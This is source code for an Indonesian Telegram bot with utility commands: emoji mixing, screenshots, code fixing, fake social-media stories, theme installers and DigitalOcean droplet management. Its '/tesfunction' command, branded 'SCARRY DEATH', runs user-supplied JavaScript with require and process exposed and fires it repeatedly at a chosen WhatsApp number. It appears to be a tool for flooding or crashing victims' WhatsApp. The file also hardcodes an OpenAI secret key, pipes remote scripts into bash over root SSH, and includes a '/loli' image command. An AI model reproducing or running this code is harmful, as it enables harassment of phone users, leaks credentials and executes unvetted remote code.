        parse_mode: "Markdown",
      });
    }
  }

  // Validasi input
  if (!emoji1 || !emoji2) {
    return bot.sendMessage(chatId, "❌ Format salah.\nGunakan: `/emojimix 😎 🤣` emojinya kasih spasi jangan di gabungin.", {
      parse_mode: "Markdown",
    });
  }

 if (blacklistedCommands.includes('/emojimix')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  await bot.sendMessage(chatId, `🌀 Sedang memproses mix emoji ${emoji1} + ${emoji2}...`);

  try {
    const apiUrl = `https://api.zenzxz.my.id/api/tools/emojimix?emoji1=${encodeURIComponent(emoji1)}&emoji2=${encodeURIComponent(emoji2)}`;
    const res = await fetch(apiUrl);

    // Deteksi jenis respon (gambar / JSON error)
    const contentType = res.headers.get("content-type");

    if (contentType && contentType.includes("application/json")) {
      const data = await res.json();
      await bot.sendMessage(chatId, `❌ Gagal mendapatkan gambar.\nRespon API: ${JSON.stringify(data, null, 2)}`);
    } else {
      const buffer = await res.arrayBuffer();
      const imageBuffer = Buffer.from(buffer);

      await bot.sendPhoto(chatId, imageBuffer, {
        caption: `✅ Hasil mix emoji ${emoji1} + ${emoji2}`,
      });
    }

  } catch (err) {
    console.error("[EMOJIMIX ERROR]", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat memproses emoji mix. Coba lagi nanti.");
  }
});

bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url.startsWith("http")) {
    return bot.sendMessage(chatId, "⚠️ Masukkan URL yang valid.\nContoh: /ssweb https://example.com");
  }
  
 if (blacklistedCommands.includes('/ssweb')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}  

    
  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  await bot.sendMessage(chatId, "🖼️ Mengambil screenshot... tunggu sebentar!");

  try {
    const apiUrl = `https://api.zenzxz.my.id/api/tools/ssweb?url=${encodeURIComponent(url)}`;
    const res = await axios.get(apiUrl);

    // Kalau respons JSON
    if (res.data && res.data.result) {
      await bot.sendPhoto(chatId, res.data.result, {
        caption: `✅ Screenshot dari:\n${url}`,
      });
    } else if (res.headers["content-type"]?.includes("image")) {
      // Kalau respons langsung gambar
      const img = await axios.get(apiUrl, { responseType: "arraybuffer" });
      await bot.sendPhoto(chatId, Buffer.from(img.data), { caption: `✅ Screenshot dari:\n${url}` });
    } else {
      throw new Error("Format respons tidak dikenali");
    }
  } catch (err) {
    console.error(err.response?.data || err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil screenshot. Coba lagi nanti atau cek URL-nya.");
  }
});

// ======== FITUR /loli (Random Loli dari API ZenZxz) ======== //
bot.onText(/^\/loli$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🔍 Sedang mengambil gambar loli... tunggu sebentar!");
    
 if (blacklistedCommands.includes('/loli')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  try {
    // Ambil gambar langsung dari API (format image/jpeg)
    const res = await axios.get("https://api.zenzxz.my.id/api/random/loli", {
      responseType: "arraybuffer",
    });

    // Kirim gambar langsung ke Telegram
    await bot.sendPhoto(chatId, Buffer.from(res.data), {
      caption: "✨ Random Loli Image",
    });
  } catch (err) {
    console.error("❌ ERROR /loli:", err);
    bot.sendMessage(chatId, "❌ Tidak dapat mengambil gambar dari API. Coba lagi nanti.");
  }
});

// ======== FITUR /bluearchive (VERSI FIX API GAMBAR LANGSUNG) ======== //
bot.onText(/^\/bluearchive$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🔍 Sedang mengambil gambar Blue Archive...");
    
 if (blacklistedCommands.includes('/bluearchive')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  try {
    // API langsung mengembalikan gambar (bukan JSON)
    const res = await axios.get("https://api.zenzxz.my.id/api/random/bluearchive", {
      responseType: "arraybuffer", // penting untuk ambil gambar
    });

    // Kirim hasil gambar ke user
    await bot.sendPhoto(chatId, Buffer.from(res.data), {
      caption: "✨ Random Blue Archive Image",
    });
  } catch (err) {
    console.error("❌ ERROR /bluearchive:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil gambar dari API ZenZxz. Coba lagi nanti.");
  }
});

// ======== FITUR /fixcode OTOMATIS PERBAIKI KODE ======== //
bot.onText(/^\/fixcode$/, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;

  if (!reply || !reply.document) {
    return bot.sendMessage(
      chatId,
      "> ⚠️ *Balas ke file .js atau .txt untuk memperbaiki kodenya.*",
      { parse_mode: "Markdown" }
    );
  }

  // Cek blacklist
  if (blacklistedCommands && blacklistedCommands.includes('/fixcode')) {
    return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
  }

  // Cek status BOT_ACTIVE
  if (typeof BOT_ACTIVE !== "undefined" && !BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp");
  }

  const fileId = reply.document.file_id;
  const fileName = reply.document.file_name;
  const fileLink = await bot.getFileLink(fileId);

  const tempDir = path.join(__dirname, "temp");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

  const tempPath = path.join(tempDir, fileName);

  try {
    // 📥 Download file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    fs.writeFileSync(tempPath, response.data);

    const originalCode = fs.readFileSync(tempPath, "utf8");
    await bot.sendMessage(
      chatId,
      "> 🔍 *Sedang memeriksa dan memperbaiki kode...*\n> Mohon tunggu sebentar ⏳",
      { parse_mode: "Markdown" }
    );

    // 🔧 Panggil fungsi perbaikan
    const fixed = await fixCodeWithAI(originalCode);

    // 💾 Simpan hasil fix
    const fixedPath = path.join(tempDir, "fixed_" + fileName);
    fs.writeFileSync(fixedPath, fixed.fixedCode);

    // 📤 Kirim file hasil perbaikan
    await bot.sendDocument(chatId, fixedPath, {
      caption: "> ✅ *Kode sudah diperbaiki dengan sukses!*",
      parse_mode: "Markdown",
    });

    // 💬 Kirim ringkasan dan penjelasan
    if (fixed.summary) {
      await bot.sendMessage(
        chatId,
        `> 🧾 *Ringkasan Perbaikan:*\n\n> ${fixed.summary.replace(/\n/g, "\n> ")}`,
        { parse_mode: "Markdown" }
      );
    }

    if (fixed.explanation) {
      const explained = formatExplanation(fixed.explanation);
      await sendLongMessage(bot, chatId, explained);
    }

    // 🧹 Bersihkan file sementara
    setTimeout(() => {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
      if (fs.existsSync(fixedPath)) fs.unlinkSync(fixedPath);
    }, 15000);

  } catch (err) {
    console.error("❌ ERROR FIXCODE:", err);
    bot.sendMessage(
      chatId,
      "> ❌ *Terjadi kesalahan saat memperbaiki kode.*\n> Cek log server untuk detailnya.",
      { parse_mode: "Markdown" }
    );
  }
});

// ======== OPENAI API UNTUK FIX CODE ======== //
async function fixCodeWithAI(code) {
  const apiKey =
    "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";

  const prompt = `
Kamu adalah AI profesional yang memperbaiki kode JavaScript.
Tugasmu:
1. Perbaiki semua error syntax & logika tanpa mengubah tujuan utama kodenya.
2. Berikan hasil kode dalam blok \`\`\`js ... \`\`\`.
3. Berikan penjelasan lengkap.
4. Buat ringkasan singkat 3 kalimat.

Kode Asli:
${code}
`;

  const res = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-4o-mini",
      messages: [
        { role: "system", content: "Kamu adalah AI yang ahli memperbaiki error code JavaScript." },
        { role: "user", content: prompt },
      ],
    },
    {
      headers: {
        Authorization: `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      maxBodyLength: Infinity,
    }
  );

  const text = res.data.choices?.[0]?.message?.content || "";

  const fixedCode =
    text.match(/```(?:js|javascript)?\n([\s\S]*?)```/)?.[1] || code;

  const explanation =
    text.match(/### Penjelasan Lengkap([\s\S]*?)(?=###|$)/)?.[1]?.trim() || "";

  const summary =
    text.match(/### Ringkasan Singkat([\s\S]*)/)?.[1]?.trim() || "";

  return { fixedCode, explanation, summary };
}

// ======== KIRIM PESAN PANJANG (AUTO POTONG) ======== //
async function sendLongMessage(bot, chatId, text) {
  const MAX = 4000;
  for (let i = 0; i < text.length; i += MAX) {
    const chunk = text.slice(i, i + MAX);
    await bot.sendMessage(chatId, chunk, { parse_mode: "Markdown" });
    await new Promise((res) => setTimeout(res, 300));
  }
}

// ======== FORMAT PENJELASAN BIAR RAPI ======== //
function formatExplanation(text) {
  const formatted = text
    .replace(/^/gm, "> ")
    .replace(/#+\s*(Penjelasan Lengkap)/gi, "🧠 *Penjelasan Lengkap*")
    .replace(/\*\*(.*?)\*\*/g, "*$1*")
    .replace(/\d+\.\s/g, "• ");

  return `> 📄 *Penjelasan Perbaikan Kode:*\n\n${formatted}`;
}

// safe-require / fallback kecil (tidak menimpa definisi yg sudah ada)
const vm = require("vm");
if (typeof global.sleep === "undefined") global.sleep = (ms) => new Promise((r) => setTimeout(r, ms));
if (typeof blacklistedCommands === "undefined") global.blacklistedCommands = [];
if (typeof BOT_ACTIVE === "undefined") global.BOT_ACTIVE = true;
const sessionsRef = (typeof sessions !== "undefined") ? sessions : (global.sessions = new Map());

bot.onText(/\/tesfunction\s+([\d\s,+-]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = msg.from?.username ? `@${msg.from.username}` : "Tidak ada username";
  const text = match[1]?.trim();
  if (!text) return bot.sendMessage(chatId, "❌ Format salah. Contoh:\n/tesfunction 628123456789,10");

  try {
    if (Array.isArray(blacklistedCommands) && blacklistedCommands.includes("/tesfunction")) {
      return bot.sendMessage(chatId, "⛔ Command ini dilarang!");
    }
  } catch (e) {}

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "❌ BOT DIMATIKAN");
  }

  const parts = text.split(/[,\s]+/).filter(Boolean);
  const targetNumber = (parts[0] || "").replace(/[^0-9]/g, "");
  const loopCount = Math.max(1, parseInt(parts[1] || "1", 10) || 1);

  if (!targetNumber) return bot.sendMessage(chatId, "❌ Nomor target tidak valid!");

  const target = `${targetNumber}@s.whatsapp.net`;

  if (!sessionsRef || sessionsRef.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada WhatsApp yang terhubung!");
  }

  const sock = [...sessionsRef.values()][0];

  if (!msg.reply_to_message) {
    return bot.sendMessage(chatId, "❌ Reply ke pesan berisi async function atau file .js!");
  }

  const repliedMsg = msg.reply_to_message;
  let functionCode = "";

  try {
    if (
      repliedMsg.document &&
      typeof repliedMsg.document.file_name === "string" &&
      repliedMsg.document.file_name.toLowerCase().endsWith(".js")
    ) {
      const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
      const res = await axios.get(fileLink, { responseType: "text" });
      functionCode = String(res.data || "");
    } else if (repliedMsg.text) {
      functionCode = String(repliedMsg.text);
    } else if (repliedMsg.caption) {
      functionCode = String(repliedMsg.caption);
    } else {
      return bot.sendMessage(chatId, "❌ Tidak ditemukan function async di pesan reply.");
    }

    const funcMatch = functionCode.match(/async\s+function\s+([A-Za-z0-9_]+)/);
    if (!funcMatch) {
      return bot.sendMessage(chatId, "⚠️ Tidak ditemukan async function di dalam kode.");
    }
    const funcName = funcMatch[1];

    let baileysExports;
    try {
      baileysExports = {
        proto,
        jidDecode,
        areJidsSameUser,
        getContentType,
        generateWAMessageFromContent,
        generateWAMessage,
        prepareWAMessageMedia,
        delay: (ms) => new Promise((r) => setTimeout(r, ms)),
      };
    } catch (e) {
      baileysExports = { delay: (ms) => new Promise((r) => setTimeout(r, ms)) };
    }

    const ensureJid = (jid) => (typeof jid === "string" ? jid : `${jid?.user || jid}@s.whatsapp.net`);

    const sandbox = {
      console,
      fs,
      path,
      chalk,
      sleep: global.sleep,
      sock,
      target: ensureJid(target),
      Buffer,
      process,
      require,
      setTimeout,
      clearTimeout,
      setInterval,
      clearInterval,

      ...baileysExports,

      relayMessage: async (jid, content, options) => {
        if (!sock || typeof sock.relayMessage !== "function") throw new Error("relayMessage tidak tersedia pada sock");
        return sock.relayMessage(ensureJid(jid), content, options);
      },

      sendMessage: async (jid, content, options) => {
        if (!sock || typeof sock.sendMessage !== "function") throw new Error("sendMessage tidak tersedia pada sock");
        return sock.sendMessage(ensureJid(jid), content, options);
      },
    };

    const context = vm.createContext(sandbox);
    const wrappedCode = `${functionCode}\n${funcName};`;

    let testFunction;
    try {
      testFunction = vm.runInContext(wrappedCode, context);
    } catch (err) {
      return bot.sendMessage(chatId, `⚠️ Kode gagal di-load: ${err.message}`);
    }

    if (typeof testFunction !== "function") {
      return bot.sendMessage(chatId, "❌ Function tidak valid atau gagal diload.");
    }

    // ======= TAMPILAN AWAL + LOADING =======
    const progressMsg = await bot.sendMessage(
      chatId,
      `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 FUNCTION TESTING
⪧ Pengirim : ${username}
⪧ Target : ${targetNumber}
⪧ Command : /tesfunction
⪧ Status : ▰▱▱▱▱ 10%
🔄 Progress: 0/${loopCount}
✅ Success: 0
</blockquote>
`,
      { parse_mode: "HTML" }
    );

    let successCount = 0;
    let errorCount = 0;

    const errors = [];

    // ======= LOOP EXECUTION =======
    for (let i = 0; i < loopCount; i++) {
      try {
        await testFunction(sock, ensureJid(target));
        successCount++;
      } catch (err) {
        errorCount++;
        errors.push(`Loop ${i + 1}: ${err?.message || String(err)}`);
      }

      const percent = Math.round(((i + 1) / loopCount) * 100);
      const filled = Math.round((percent / 100) * 5);
      const bar = "▰".repeat(filled) + "▱".repeat(5 - filled) + ` ${percent}%`;

      try {
        await bot.editMessageText(
          `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 FUNCTION TESTING
⪧ Pengirim : ${username}
⪧ Target : ${targetNumber}
⪧ Command : /tesfunction
⪧ Status : ${bar}

🔄 Progress: ${i + 1}/${loopCount}
✅ Success: ${successCount}
❌ Error: ${errorCount}
</blockquote>`,
          { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: "HTML" }
        );
      } catch {}

      await sleep(800);
    }

    // ======= FINAL =======
    await bot.editMessageText(
      `
<blockquote>𝚂𝙲𝙰𝚁𝚁𝚈 ⵢ 𝙳𝙴𝙰𝚃𝙷 FUNCTION TESTING
⪧ Pengirim : ${username}
⪧ Target : ${targetNumber}
⪧ Command : /tesfunction
⪧ Status : ✔️ SUCCESS...

🔄 Progress: ${loopCount}/${loopCount}
✅ Success: ${successCount}
❌ Error: ${errorCount}
</blockquote>
`,
      {
        chat_id: chatId,
        message_id: progressMsg.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "CEK ⵢ TARGET", url: `https://wa.me/${targetNumber}` }]],
        },
      }
    );

    if (errors.length > 0) {
      bot.sendMessage(chatId, `⚠️ ERROR TERDETEKSI:\n\n${errors.join("\n")}`);
    }

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan:\n${err?.message || String(err)}`);
  }
});

// ======================================================
//   END OF /tesfunction
// ======================================================

//---------------------------- ( Case Md ) ------------------------------------\\

const API_BASE = "https://api.zenzxz.my.id/api/maker/fakestory";
const API_KEY = ""; // opsional: isi kalau API butuh apikey, contoh: "https://api.zenzxz.my.id/api/maker/fakestory"

// === HANDLER: Command /fakestory ===
bot.onText(/^\/fakestory (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|").map((a) => a.trim());
  if (args.length < 3) {
    bot.sendMessage(chatId, "⚠️ Format salah!\nGunakan: /fakestory username | caption | link_foto");
    return;
  }
    
 if (blacklistedCommands.includes('/fakestory')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }

  const [username, caption, ppurl] = args;
  await buatFakeStory(chatId, username, caption, ppurl, bot);
});

// === HANDLER: Reply ke foto dengan "username | caption" ===
bot.on("message", async (msg) => {
  if (!msg.reply_to_message || !msg.text) return;
  const text = msg.text.trim();
  if (!text.includes("|")) return;

  const [username, caption] = text.split("|").map((t) => t.trim());
  if (!username || !caption) return;

  // Pastikan pesan yang direply ada foto
  const photos = msg.reply_to_message.photo;
  if (!photos) return;

  // Ambil resolusi terbesar dari foto
  const fileId = photos[photos.length - 1].file_id;
  const fileLink = await bot.getFileLink(fileId);

  await buatFakeStory(msg.chat.id, username, caption, fileLink, bot);
});

// === FUNGSI UTAMA PEMBUAT STORY ===
async function buatFakeStory(chatId, username, caption, ppurl, bot) {
  const statusMsg = await bot.sendMessage(chatId, "⏳ Membuat fake story... tunggu sebentar ya!");

  try {
    let url = `${API_BASE}?username=${encodeURIComponent(username)}&caption=${encodeURIComponent(caption)}&ppurl=${encodeURIComponent(ppurl)}`;
    if (API_KEY) url += `&apikey=${API_KEY}`;

    const res = await fetch(url);
    if (!res.ok) {
      await bot.editMessageText(`❌ Gagal membuat story (status ${res.status})`, {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
      return;
    }

    const buffer = Buffer.from(await res.arrayBuffer());

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ Fake story untuk *${username}* berhasil dibuat!`,
      parse_mode: "Markdown",
    });

    await bot.deleteMessage(chatId, statusMsg.message_id);
  } catch (err) {
    console.error("Error:", err);
    await bot.editMessageText(`❌ Terjadi kesalahan: ${err.message}`, {
      chat_id: chatId,
      message_id: statusMsg.message_id,
    });
  }
}

// === COMMAND /ustadz ===
bot.onText(/\/ustadz(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(
      chatId,
      "🕌 Contoh penggunaan:\n`/ustadz Hai semua`",
      { parse_mode: "Markdown" }
    );
  }

 if (blacklistedCommands.includes('/ustadz')) {
  return bot.sendMessage(chatId, '⛔ Command ini dilarang!');
}
   

  if (!BOT_ACTIVE) {
    return bot.sendMessage(chatId, "BOT DIMATIKAN OLEH @raraa_imuppp" ); 
    }
    
  await bot.sendMessage(chatId, "⏳ Sedang membuat gambar Ustadz...");

  try {
    // 🔥 API tanpa apikey, hanya pakai text
    const apiUrl = `https://api.zenzxz.my.id/api/maker/ustadz2?text=${encodeURIComponent(query)}`;

    // ambil gambar dari API
    const response = await axios.get(apiUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data, "binary");

    // kirim ke telegram sebagai foto
    await bot.sendPhoto(chatId, buffer, {
      caption: `🕌 Soalan: ${query}`,
    });
  } catch (err) {
    console.error("Error:", err.message);
    bot.sendMessage(chatId, `⚠️ Terjadi kesalahan: ${err.message}`);
  }
});

bot.onText(/^\/uninstalltema (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  const args = text.split("|");
  if (args.length < 2) return bot.sendMessage(chatId, "Contoh: /uninstalltema ipvps|pwvps");

  const ipvps = args[0];
  const passwd = args[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
  const ssh = new Client();

  await bot.sendMessage(chatId, "Memproses *uninstall tema pterodactyl*...\nTunggu 1–10 menit.", { parse_mode: "Markdown" });

  ssh.on('ready', () => {
    ssh.exec(command, (err, stream) => {
      if (err) return bot.sendMessage(chatId, "❌ Error SSH");

      stream.on('close', async () => {
        await bot.sendMessage(chatId, "Berhasil *uninstall tema pterodactyl* ✅", { parse_mode: "Markdown" });
        ssh.end();
      }).on('data', (data) => {
        console.log(data.toString());
        stream.write(`skyzodev\n`);
        stream.write(`2\n`);
        stream.write(`y\n`);
        stream.write(`x\n`);
      });
    });
  }).on('error', () => {
    bot.sendMessage(chatId, "❌ IP atau Password VPS salah");
  }).connect(connSettings);
});

bot.onText(/^\/installtemastellar (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  const args = text.split("|");
  if (args.length < 2) return bot.sendMessage(chatId, "Contoh: /installtemastellar ipvps|pwvps");

  const ipvps = args[0];
  const passwd = args[1];

  const connSettings = {
    host: ipvps,
    port: 22,
    username: 'root',
    password: passwd
  };

  const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
  const ssh = new Client();

  bot.sendMessage(chatId, "Install *tema stellar*...\nTunggu 1–10 menit.", { parse_mode: "Markdown" });

  ssh.on('ready', () => {
    ssh.exec(command, (err, stream) => {
      if (err) return;

      stream.on('close', async () => {
        bot.sendMessage(chatId, "Berhasil install *tema stellar* ✅", { parse_mode: "Markdown" });
        ssh.end();
      }).on('data', (data) => {
        console.log(data.toString());
        stream.write(`skyzodev\n`);
        stream.write(`1\n`);
        stream.write(`1\n`);
        stream.write(`yes\n`);
        stream.write(`x\n`);
      });
    });
  }).on('error', () => {
    bot.sendMessage(chatId, "❌ IP atau Password VPS salah");
  }).connect(connSettings);
});

bot.onText(/^\/installtemabilling (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|");

  if (args.length < 2) return bot.sendMessage(chatId, "Contoh: /installtemabilling ipvps|pwvps");

  const ipvps = args[0];
  const passwd = args[1];

  const connSettings = { host: ipvps, port: 22, username: 'root', password: passwd };
  const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
  const ssh = new Client();

  bot.sendMessage(chatId, "Install *tema billing*...\nTunggu 1–10 menit.", { parse_mode: "Markdown" });

  ssh.on('ready', () => {
    ssh.exec(command, (err, stream) => {
      stream.on('close', async () => {
        bot.sendMessage(chatId, "Berhasil install *tema billing* ✅", { parse_mode: "Markdown" });
        ssh.end();
      }).on('data', (data) => {
        console.log(data.toString());
        stream.write(`skyzodev\n`);
        stream.write(`1\n`);
        stream.write(`2\n`);
        stream.write(`yes\n`);
        stream.write(`x\n`);
      });
    });
  }).on('error', () => {
    bot.sendMessage(chatId, "❌ IP atau Password VPS salah");
  }).connect(connSettings);
});

bot.onText(/^\/installtemaelysium (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|");

  if (args.length < 2) return bot.sendMessage(chatId, "Contoh: /installtemaelysium ipvps|pwvps");

  const ipvps = args[0];
  const passwd = args[1];

  const connSettings = { host: ipvps, port: 22, username: 'root', password: passwd };
  const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`;
  const ssh = new Client();

  bot.sendMessage(chatId, "Install *tema billing*...\nTunggu 1–10 menit.", { parse_mode: "Markdown" });

  ssh.on('ready', () => {
    ssh.exec(command, (err, stream) => {
      stream.on('close', async () => {
        bot.sendMessage(chatId, "Berhasil install *tema billing* ✅", { parse_mode: "Markdown" });
        ssh.end();
      }).on('data', (data) => {
        console.log(data.toString());
        stream.write(`skyzodev\n`);
        stream.write(`1\n`);
        stream.write(`2\n`);
        stream.write(`yes\n`);
        stream.write(`x\n`);
      });
    });
  }).on('error', () => {
    bot.sendMessage(chatId, "❌ IP atau Password VPS salah");
  }).connect(connSettings);
});

bot.onText(/^\/uninstallpanel (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|");

  if (args.length < 2) return bot.sendMessage(chatId, "Contoh: /uninstallpanel ipvps|pwvps");

  const ipvps = args[0];
  const passwd = args[1];

  const connSettings = { host: ipvps, port: 22, username: 'root', password: passwd };
  const command = `bash <(curl -s https://pterodactyl-installer.se)`;
  const ssh = new Client();

  bot.sendMessage(chatId, "Uninstall *server panel*...\nTunggu 1–10 menit.", { parse_mode: "Markdown" });

  ssh.on('ready', () => {
    ssh.exec(command, (err, stream) => {
      stream.on('close', async () => {
        bot.sendMessage(chatId, "Berhasil *uninstall server panel* ✅", { parse_mode: "Markdown" });
        ssh.end();
      }).on('data', (data) => {
        console.log(data.toString());

        if (data.toString().includes("Input 0-6")) stream.write("6\n");
        if (data.toString().includes("(y/N)")) stream.write("y\n");
        if (data.toString().includes("Choose the panel user")) stream.write("\n");
        if (data.toString().includes("Choose the panel database")) stream.write("\n");
      });
    });
  }).on('error', () => {
    bot.sendMessage(chatId, "❌ IP atau Password VPS salah");
  }).connect(connSettings);
});

// ======= DIGITALOCEAN FEATURES FOR TELEGRAM (paste under your bot instance) =======
const do_api_key = config.do_api_key;
const OWNER = config.OWNER_ID;

// helper
const generateRandomPassword = (len = 12) => {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|:;<>?,./';
  let pass = '';
  for (let i = 0; i < len; i++) pass += chars[Math.floor(Math.random() * chars.length)];
  return pass;
};

// ---------- /listdroplet
// Helper buat bagi pesan panjang biar nggak nabrak limit Telegram
function chunkMessage(text, chunkSize = 4000) {
  const chunks = [];
  for (let i = 0; i < text.length; i += chunkSize) {
    chunks.push(text.slice(i, i + chunkSize));
  }
  return chunks;
}

bot.onText(/^\/listdroplet$/i, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");
  }

  try {
    // Tambah per_page biar lebih banyak droplet yang diambil
    const res = await axios.get('https://api.digitalocean.com/v2/droplets?per_page=200', {
      headers: { Authorization: `Bearer ${do_api_key}` }
    });

    const droplets = res.data.droplets || [];
    const totalDroplets = res.data.meta?.total ?? droplets.length;

    let message = `📃 *List Droplet DigitalOcean*\n\n` +
                  `Total droplet terdeteksi: *${totalDroplets}*\n` +
                  `Droplet yang ditampilkan di sini: *${droplets.length}*\n\n`;

    if (droplets.length === 0) {
      message += 'Tidak ada droplet yang tersedia!';
    } else {
      droplets.forEach((droplet, index) => {
        const ipv4 = (droplet.networks && droplet.networks.v4)
          ? (droplet.networks.v4.find(n => n.type === 'public') || {}).ip_address || 'Tidak ada IP!'
          : 'Tidak ada IP!';

        const osName = droplet.image
          ? (droplet.image.distribution || droplet.image.slug || 'Unknown')
          : 'Unknown';

        message +=
`#${index + 1}
🆔 ID       : ${droplet.id}
🖥 Hostname : ${droplet.name}
👤 Username : root
🌐 IP       : ${ipv4}
💾 RAM      : ${droplet.memory} MB
🧮 CPU      : ${droplet.vcpus} CPU
📀 Storage  : ${droplet.disk} GB
💿 OS       : ${osName}
⚙️ Status   : ${droplet.status}

`;
      });
    }

    // Bagi pesan kalau kepanjangan
    const parts = chunkMessage(message, 4000);
    for (const part of parts) {
      await bot.sendMessage(chatId, part, { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err?.response?.data || err);
    const apiMsg = err?.response?.data?.message || err?.response?.data?.id || '';
    await bot.sendMessage(
      chatId,
      `❌ Terjadi kesalahan saat mengambil data droplet.\n\nDetail: ${apiMsg || err.message || err}`
    );
  }
});
// ---------- /restartvps <id>
bot.onText(/^\/restartvps(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");

  const dropletId = match[1];
  if (!dropletId) return bot.sendMessage(chatId, "⚠️ Contoh penggunaan: /restartvps 12345678");

  try {
    const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;
    const resp = await axios.post(apiUrl, { type: 'reboot' }, {
      headers: { Authorization: `Bearer ${do_api_key}`, 'Content-Type': 'application/json' }
    });
    const action = resp.data.action;
    await bot.sendMessage(chatId, `✅ Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
  } catch (err) {
    console.error(err?.response?.data || err);
    const msgErr = err?.response?.data?.message || err.message || err;
    await bot.sendMessage(chatId, `❌ Gagal melakukan restart VPS: ${msgErr}`);
  }
});

// ---------- /rebuild <id>  (uses ubuntu-20-04-x64 - change if needed)
bot.onText(/^\/rebuild(?:\s+(\d+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin menggunakan fitur ini.");
  const dropletId = match[1];
  if (!dropletId) return bot.sendMessage(chatId, "⚠️ Contoh penggunaan: /rebuild 12345678");

  try {
    const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;
    const resp = await axios.post(apiUrl, {
      type: 'rebuild',
      image: 'ubuntu-20-04-x64'
    }, {
      headers: { Authorization: `Bearer ${do_api_key}`, 'Content-Type': 'application/json' }
    });

    const action = resp.data.action;
    await bot.sendMessage(chatId, `✅ Rebuild VPS berhasil dimulai. Status aksi: ${action.status}`);

    // after rebuild, fetch droplet info (give time)
    await sleep(60000);
    const vpsInfo = await axios.get(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: { Authorization: `Bearer ${do_api_key}` }
    });
    const droplet = vpsInfo.data.droplet;
    const ipv4 = (droplet.networks && droplet.networks.v4)
      ? (droplet.networks.v4.find(n => n.type === 'public') || {}).ip_address || 'Tidak ada IP!'
      : 'Tidak ada IP!';
